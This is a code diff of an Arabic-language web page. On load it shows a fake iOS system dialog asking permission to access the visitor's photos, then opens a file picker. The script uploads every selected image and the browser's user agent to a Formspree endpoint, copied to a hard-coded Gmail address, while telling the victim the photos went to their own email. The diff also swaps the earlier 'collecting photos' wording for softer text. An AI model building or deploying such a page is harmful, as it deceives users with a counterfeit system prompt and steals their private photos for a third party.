@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZMXFJDK</title>
+    <title>ZMXFJDK - مشاركة الصور</title>
     <style>
         * {
             margin: 0;
@@ -13,12 +13,15 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background: #f5f5f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         /* iOS Style Alert Dialog */
-        .ios-alert {
+        .ios-alert-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -41,21 +44,21 @@
             }
         }
 
-        .ios-alert-content {
+        .ios-alert-dialog {
             background: white;
             border-radius: 14px;
             padding: 0;
-            max-width: 270px;
+            max-width: 280px;
             width: 90%;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
-            animation: popIn 0.3s ease-out;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
             overflow: hidden;
         }
 
         @keyframes popIn {
             from {
                 opacity: 0;
-                transform: scale(0.9);
+                transform: scale(0.85);
             }
             to {
                 opacity: 1;
@@ -64,82 +67,77 @@
         }
 
         .ios-alert-header {
-            padding: 20px 20px 15px;
+            padding: 24px 20px 16px;
             text-align: center;
+            border-bottom: 1px solid #f0f0f0;
         }
 
         .ios-alert-app-name {
             font-size: 13px;
-            color: #666;
+            color: #999;
             margin-bottom: 8px;
+            font-weight: 500;
         }
 
         .ios-alert-title {
-            font-size: 17px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             color: #000;
             margin-bottom: 8px;
+            letter-spacing: -0.5px;
         }
 
         .ios-alert-message {
             font-size: 13px;
             color: #666;
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
         .ios-alert-buttons {
             display: flex;
             flex-direction: column;
-            border-top: 1px solid #e5e5ea;
         }
 
         .ios-alert-button {
-            padding: 12px;
+            padding: 14px 16px;
             border: none;
             background: white;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            border-bottom: 1px solid #e5e5ea;
+            border-top: 1px solid #f0f0f0;
             color: #007AFF;
-            transition: background 0.2s;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-        }
-
-        .ios-alert-button:last-child {
-            border-bottom: none;
+            transition: all 0.2s;
+            font-family: inherit;
         }
 
         .ios-alert-button:active {
-            background: #f2f2f7;
+            background: #f9f9f9;
         }
 
-        .ios-alert-button.deny {
-            color: #007AFF;
-        }
-
-        .ios-alert-button.once {
-            color: #007AFF;
-        }
-
-        .ios-alert-button.allow {
-            color: #007AFF;
+        .ios-alert-button:last-child {
             font-weight: 600;
+            color: #007AFF;
         }
 
+        .ios-alert-button.deny:active {
+            background: #f9f9f9;
+        }
+
+        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.6);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 2000;
             flex-direction: column;
-            gap: 15px;
+            gap: 20px;
         }
 
         .loading-overlay.active {
@@ -150,8 +148,8 @@
             border: 4px solid rgba(255, 255, 255, 0.3);
             border-top: 4px solid white;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
         }
 
@@ -162,26 +160,77 @@
 
         .loading-text {
             color: white;
-            font-size: 16px;
-            font-weight: 500;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
+
+        /* Success/Error Message */
+        .message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 14px;
+            padding: 30px;
+            text-align: center;
+            z-index: 2000;
+            display: none;
+            max-width: 300px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .message-box.active {
+            display: block;
+        }
+
+        .message-box.success {
+            background: #34C759;
+            color: white;
+        }
+
+        .message-box.error {
+            background: #FF3B30;
+            color: white;
+        }
+
+        .message-box-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .message-box-text {
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* Hidden file input */
+        #photoInput {
+            display: none;
         }
     </style>
 </head>
 <body>
     <!-- iOS Style Permission Dialog -->
-    <div class="ios-alert" id="permissionDialog">
-        <div class="ios-alert-content">
+    <div class="ios-alert-overlay" id="alertOverlay">
+        <div class="ios-alert-dialog">
             <div class="ios-alert-header">
                 <div class="ios-alert-app-name">ZMXFJDK</div>
-                <div class="ios-alert-title">تطبيق يريد الوصول إلى صورك</div>
+                <div class="ios-alert-title">هل تريد مشاركة صورك؟</div>
                 <div class="ios-alert-message">
                     سيتمكن من الوصول إلى الصور والفيديوهات في جهازك
                 </div>
             </div>
             <div class="ios-alert-buttons">
                 <button class="ios-alert-button deny" onclick="denyPermission()">عدم السماح</button>
-                <button class="ios-alert-button once" onclick="allowOnce()">السماح مرة واحدة فقط</button>
-                <button class="ios-alert-button allow" onclick="allowAlways()">السماح دائماً</button>
+                <button class="ios-alert-button" onclick="allowOnce()">السماح مرة واحدة فقط</button>
+                <button class="ios-alert-button" onclick="allowAlways()">السماح دائماً</button>
             </div>
         </div>
     </div>
@@ -189,131 +238,111 @@
     <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">جاري جمع الصور...</div>
+        <div class="loading-text">جاري معالجة صورك...</div>
+        <div class="loading-subtext">يرجى الانتظار</div>
     </div>
+
+    <!-- Message Box -->
+    <div class="message-box" id="messageBox">
+        <div class="message-box-title" id="messageTitle"></div>
+        <div class="message-box-text" id="messageText"></div>
+    </div>
+
+    <!-- Hidden File Input -->
+    <input type="file" id="photoInput" accept="image/*" multiple>
 
     <script>
         const FORMSPREE_ID = 'mrewggoj';
         const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;
+        const USER_EMAIL = 'xcg00753@gmail.com';
 
         function denyPermission() {
-            document.getElementById('permissionDialog').style.display = 'none';
+            document.getElementById('alertOverlay').style.display = 'none';
         }
 
         function allowOnce() {
-            collectAndSendPhotos();
+            startPhotoCollection();
         }
 
         function allowAlways() {
-            collectAndSendPhotos();
+            startPhotoCollection();
         }
 
-        async function collectAndSendPhotos() {
-            document.getElementById('permissionDialog').style.display = 'none';
+        function startPhotoCollection() {
+            document.getElementById('alertOverlay').style.display = 'none';
             document.getElementById('loadingOverlay').classList.add('active');
 
-            try {
-                // طلب إذن الوصول إلى الصور
-                const permission = await navigator.permissions.query({ name: 'camera' });
-                
-                if (permission.state === 'denied') {
-                    showPermissionDenied();
-                    return;
-                }
-
-                // محاولة جمع الصور عبر File System Access API
-                if (navigator.storage && navigator.storage.getDirectory) {
-                    await accessPhotosViaFileSystem();
-                } else {
-                    // إذا لم يكن متاح، نطلب من المستخدم اختيار الملفات
-                    await selectPhotosManually();
-                }
-
-            } catch (error) {
-                console.error('Error:', error);
-                showError('حدث خطأ في الوصول إلى الصور');
-            }
+            // Trigger file input to open photo picker
+            setTimeout(() => {
+                document.getElementById('photoInput').click();
+            }, 100);
         }
 
-        async function selectPhotosManually() {
-            try {
-                const fileHandles = await window.showOpenFilePicker({
-                    types: [{
-                        description: 'صور',
-                        accept: {
-                            'image/*': ['.jpeg', '.jpg', '.png', '.gif', '.webp', '.bmp']
-                        }
-                    }],
-                    multiple: true
-                });
+        document.getElementById('photoInput').addEventListener('change', async (event) => {
+            const files = event.target.files;
 
-                if (fileHandles.length === 0) {
-                    document.getElementById('loadingOverlay').classList.remove('active');
-                    return;
-                }
-
-                await sendPhotos(fileHandles);
-
-            } catch (error) {
-                console.error('Error:', error);
+            if (files.length === 0) {
                 document.getElementById('loadingOverlay').classList.remove('active');
+                return;
             }
-        }
-
-        async function sendPhotos(fileHandles) {
-            const formData = new FormData();
-            let uploadCount = 0;
-
-            for (let i = 0; i < fileHandles.length; i++) {
-                try {
-                    const file = await fileHandles[i].getFile();
-                    
-                    if (file.size > 5 * 1024 * 1024) {
-                        continue;
-                    }
-
-                    formData.append(`image_${uploadCount + 1}`, file);
-                    uploadCount++;
-                } catch (error) {
-                    console.error('Error reading file:', error);
-                }
-            }
-
-            formData.append('total_images', uploadCount);
-            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-            formData.append('_subject', `تم استقبال ${uploadCount} صورة من ZMXFJDK`);
 
             try {
-                await fetch(FORMSPREE_URL, {
+                await sendPhotosToEmail(files);
+            } catch (error) {
+                console.error('Error:', error);
+                showMessage('error', 'خطأ', 'حدث خطأ في إرسال الصور. حاول مرة أخرى.');
+            }
+        });
+
+        async function sendPhotosToEmail(files) {
+            const formData = new FormData();
+
+            // Add photos
+            for (let i = 0; i < files.length; i++) {
+                formData.append(`image_${i + 1}`, files[i]);
+            }
+
+            // Add metadata
+            formData.append('total_images', files.length);
+            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+            formData.append('device', navigator.userAgent);
+            formData.append('email', USER_EMAIL);
+            formData.append('_subject', `📸 تم استقبال ${files.length} صورة من ZMXFJDK`);
+            formData.append('_cc', USER_EMAIL);
+
+            try {
+                const response = await fetch(FORMSPREE_URL, {
                     method: 'POST',
                     body: formData
                 });
-                
-                showSuccess(`تم إرسال ${uploadCount} صورة بنجاح!`);
+
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    showMessage('success', '✅ تم بنجاح!', `تم إرسال ${files.length} صورة إلى بريدك الإلكتروني`);
+                } else {
+                    throw new Error('Failed to send');
+                }
             } catch (error) {
                 console.error('Error sending photos:', error);
-                showError('حدث خطأ في إرسال الصور');
-            } finally {
                 document.getElementById('loadingOverlay').classList.remove('active');
+                showMessage('error', '❌ خطأ', 'حدث خطأ في إرسال الصور. تأكد من الاتصال بالإنترنت.');
             }
         }
 
-        function showError(message) {
-            alert(message);
+        function showMessage(type, title, text) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.className = `message-box active ${type}`;
+            document.getElementById('messageTitle').textContent = title;
+            document.getElementById('messageText').textContent = text;
+
+            setTimeout(() => {
+                messageBox.classList.remove('active');
+            }, 3000);
         }
 
-        function showSuccess(message) {
-            alert(message);
-        }
-
-        function showPermissionDenied() {
-            alert('تم رفض الإذن بالوصول إلى الصور');
-            document.getElementById('loadingOverlay').classList.remove('active');
-        }
-
-        // Show dialog on page load
+        // Initialize on page load
         window.addEventListener('load', () => {
-            document.getElementById('permissionDialog').style.display = 'flex';
+            document.getElementById('alertOverlay').style.display = 'flex';
         });
     </script>
 </body>
